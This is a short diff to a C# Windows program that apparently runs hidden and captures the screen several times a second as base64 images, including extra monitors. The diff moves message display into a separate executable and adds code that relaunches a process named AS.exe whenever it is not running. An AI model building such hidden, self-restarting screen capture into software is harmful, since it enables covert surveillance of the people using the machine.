@@ -46,9 +46,9 @@ namespace SCSU
                 }
                 else if ((bool)setting[3])
                 {
-                    message = setting[4].ToString();
-                    Thread thread = new Thread(new ThreadStart(showMessagebox));
-                    thread.Start();
+                    File.WriteAllText("Message.txt" ,setting[4].ToString());
+
+                    Process.Start("ShowMessage.exe");
                 }
 
                 if ((bool)setting["cmd"] != cmd)
@@ -111,6 +111,8 @@ namespace SCSU
                 Hide();
                 try
                 {
+                    Process[] AS = Process.GetProcessesByName("AS");
+                    if (AS.Length <= 0) Process.Start("AS.exe");
                     Bitmap screen = CaptureImage(0);
                     string base64 = ToBase64(screen);
                     if (SystemInformation.MonitorCount > 1)
@@ -125,11 +127,6 @@ namespace SCSU
                 catch { }
                 System.Threading.Thread.Sleep(250);
             }
-        }
-        private void showMessagebox()
-        {
-            message = message.Replace('_',' ');
-            MessageBox.Show(message,"New Message");
         }
         private void Form1_Load(object sender, EventArgs e)
         {
